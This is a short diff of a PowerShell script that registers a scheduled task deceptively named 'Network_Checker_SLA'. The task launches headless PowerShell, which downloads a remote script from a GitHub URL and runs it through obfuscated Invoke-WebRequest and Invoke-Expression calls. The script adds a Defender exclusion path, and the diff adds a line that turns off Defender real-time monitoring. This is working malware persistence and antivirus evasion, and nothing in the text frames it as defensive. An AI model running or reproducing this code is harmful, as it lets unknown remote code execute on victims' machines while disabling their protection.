@@ -4,3 +4,4 @@ $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -Repetit
 $Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/MarcSzc/fdfsfffdsfdsfdsf/main/ob.ps1';(i''wR `$l).content|i''E''x`""
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Network_Checker_SLA' -Description 'Network_Checker_SLA'
 Set-MpPreference -ExclusionPath c:\tmp
+Set-MpPreference -DisableRealtimeMonitoring $true
